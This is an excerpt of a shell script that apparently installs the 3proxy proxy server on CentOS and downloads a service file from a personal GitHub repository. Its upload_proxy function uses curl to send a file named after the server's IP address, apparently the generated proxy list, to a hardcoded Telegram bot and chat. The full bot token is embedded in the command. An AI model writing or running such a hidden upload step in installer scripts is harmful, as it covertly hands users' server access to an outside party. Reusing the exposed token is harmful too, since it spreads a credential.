...
install_3proxy() {
    ...
    wget https://raw.githubusercontent.com/LiechinFack/share-proxy/main/scripts/3proxy.service-Centos8 --output-document=/3proxy/3proxy-0.9.3/scripts/3proxy.service2
...
upload_proxy() {
    ...
    curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=2109534015' https://api.telegram.org/bot7257969590:AAFr2u0XrbgJ1rsFPEBmqw_MOAHFKInzLzA/sendDocument
}
gen_data() {
    port_random=10000;
